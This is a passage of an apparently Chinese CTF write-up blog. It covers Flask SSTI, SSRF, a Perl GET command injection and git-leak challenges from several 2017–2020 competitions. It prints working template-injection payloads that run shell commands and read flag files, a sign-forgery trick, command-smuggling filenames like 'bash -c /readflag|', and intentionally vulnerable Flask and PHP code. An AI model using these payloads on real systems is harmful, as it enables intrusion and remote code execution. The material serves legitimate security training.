<p><code>[&#39;__glo&#39;+&#39;bals__&#39;]</code></p>
<p>最终payload:</p>
<p><code>?search=&#123;&#123;"".__class__.__bases__[0].__subclasses__()[250].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /').read()")&#125;&#125;</code></p>
<hr>
<h4 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h4><p>找参数</p>
<p>是name</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat .&#x2F;flag.txt&#39;).read()&quot;) &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h4><p>py脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># print("RC4加密主函数")</span>
  s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
  crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span>  crypt
<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
  <span class="token comment"># print("原来的 s 盒：%s" % s_box)</span>
  j <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
​    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
​    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
  <span class="token comment"># print("混乱后的 s 盒：%s"% s_box)</span>
  <span class="token keyword">return</span> s_box
<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token comment"># print("调用加密程序成功。")</span>
  res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
​    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
​    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
​    box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
​    t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
​    k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
​    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
  cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的字符串是：%s"</span> <span class="token operator">%</span>quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token comment">#HereIsTreasure是秘钥</span>
rc4_main<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">,</span><span class="token string">"&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()&#125;&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">secret?secret&#x3D;.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98&#x2F;%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h4 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h4><p>题目给出源码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment">#encoding=utf-8</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> urllib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> json
<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>

<span class="token comment">#Task类</span>
<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#初始化</span>
        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action
        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param
        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign
        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#SandBox For Remote_Addr</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#通过checkSign方法检测登录</span>
			<span class="token comment">#"scan""read"都要存在于action中，才能执行以下两条if</span>
            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>
                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>
        <span class="token keyword">return</span> result
    
    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#当我们传入的action和param经过getSign()函数后和sign相等即可返回true</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token comment">#generate Sign For Action Scan.</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#/geneSign路由可以生成我们需要的md5</span>
<span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#get传参param</span>
    action <span class="token operator">=</span> <span class="token string">"scan"</span>
    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token comment">#调用getSign()</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#/De1ta路由</span>
<span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cookies传参action</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#get传参param</span>
    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cookies传参sign</span>
    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>
    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token comment">#用我们传上去的action,param,sign参数及ip构造Task类对象</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#执行Task类对象的Exec</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span>



<span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#secert_key + param + action拼接再md5</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>
    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#waf禁用gopher和file协议</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>提示flag在.&#x2F;flag.txt中</p>
<p>超详细wp：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13685940.html">De1CTF 2019]SSRF Me - My_Dreams - 博客园 (cnblogs.com)</a></p>
<p>不妨假设 secert_key 是 xxx ，那么在开始访问 &#x2F;geneSign?param&#x3D;flag.txt 的时候，返回的 md5 就是 md5(‘xxx’ + ‘flag.txt’ + ‘scan’) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。</p>
<p>直接构造访问 &#x2F;geneSign?param&#x3D;flag.txtread ，拿到的 md5 就是 md5(‘xxx’ + ‘flag.txtread’ + ‘scan’) ，等价于 md5(‘xxxflag.txtreadscan’) ，这就达到了目标。</p>
<p>直接访问 &#x2F;De1ta?param&#x3D;flag.txt 构造 Cookie: sign&#x3D;7a2a235fcc9218dfe21e4eb400a11b5e;action&#x3D;readscan</p>
<hr>
<h4 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h4><p>[perl脚本中GET命令执行漏洞（<a target="_blank" rel="noopener" href="https://www.codenong.com/cs105868449/">HITCON 2017]SSRFme） | 码农家园 (codenong.com)</a></p>
<p>[刷题<a target="_blank" rel="noopener" href="https://www.cnblogs.com/karsa/p/14111891.html">HITCON 2017]SSRFme - kar3a - 博客园 (cnblogs.com)</a></p>
<p>这道题的考点是 <code>GET</code> 这个命令的一个命令执行漏洞，主要是 perl 的 feature，在 open 可以执行命令：</p>
<p><img src="/images/ssrfme.png" alt="ssrfme.png"></p>
<p>首先它会进入sandbox&#x2F;文件夹然后进入一个 把 “orange118.239.16.215” md5摘要命名的文件夹。再然后执行一个“GET +我们传入的url参数” 这个命令。最后把执行的命令写入我们传入以我们传入的filename为文件名的文件内。<br> 了解了基本流程和上面说的漏洞后，我的思路是：</p>
<ol>
<li><p>先创建一个以我们要执行的命令为文件名的文件</p>
</li>
<li><p>然后执行我们的命令</p>
</li>
<li><p>查看我们创建的文件</p>
</li>
<li><p>使用2次<code>?url=file:ls /|&amp;filename=ls /|</code> 第一次是为了创建<code>ls /|</code> 文件第二次就可以执行命令，并把结果写入文件了。</p>
</li>
<li><p>访问文件，先将<code>orange118.239.16.215</code>md5然后就可以知道文件路径了执行<code>/sandbox/b637d38ae20fabeb50aa7ca03ba02081/ls /|</code> 可以看到有个 <code>readflag</code>,那么就尝试运行它吧。</p>
</li>
<li><p>老样子执行2遍<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></p>
</li>
<li><p>接着去访问<code>/sandbox/b637d38ae20fabeb50aa7ca03ba02081/bash -c /readflag|</code> 即可以得到我们的flag。</p>
</li>
</ol>
<p><code>bash -c</code>可以执行命令</p>
<p><img src="/images/ssrfme2.png" alt="ssrfme2.png"></p>
<hr>
<h1 id="GIT泄露"><a href="#GIT泄露" class="headerlink" title="GIT泄露"></a>GIT泄露</h1><h4 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h4><p>dirsearch扫到git 泄露。</p>
<p>flag.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token variable">$yds</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dog"</span><span class="token punctuation">;</span>
<span class="token variable">$is</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cat"</span><span class="token punctuation">;</span>
<span class="token variable">$handsome</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yds'</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$y</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$$x</span> <span class="token operator">=</span> <span class="token variable">$$y</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$x</span> <span class="token operator">=></span> <span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$x</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$x</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$handsome</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$yds</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span>  <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$is</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"the flag is: "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

